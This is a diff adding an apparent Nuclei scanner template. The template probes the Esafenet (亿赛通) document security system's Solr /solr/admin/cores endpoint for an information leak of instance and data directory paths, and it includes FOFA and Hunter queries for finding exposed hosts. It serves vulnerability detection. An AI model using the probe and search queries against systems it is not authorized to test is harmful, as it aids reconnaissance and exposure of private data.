@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - part: body
+          type: word
+          words:
+            - str name="instanceDir"
+            - str name="dataDir
+      matchers-condition: and
+      raw:
+        - |
+          GET /solr/admin/cores HTTP/1.1
+          Host: {{Hostname}}
+id: esafenet-cdgserver3-solr-admin-cores-infoleak
+info:
+    author: cmz
+    description: 亿赛通文档安全管理系统/solr/admin/cores信息泄露
+    metadata:
+        fofa-query: title="亿赛通文档安全管理系统"
+        hunter-query: app.name="ESAFENET 亿赛通文档安全管理系统"
+        max-request: 1
+        verified: true
+    name: 亿赛通文档安全管理系统/solr/admin/cores信息泄露
+    reference:
+        - https://
+    severity: medium
+    tags:
+        - esafenet
+        - infoleak
+        - solr
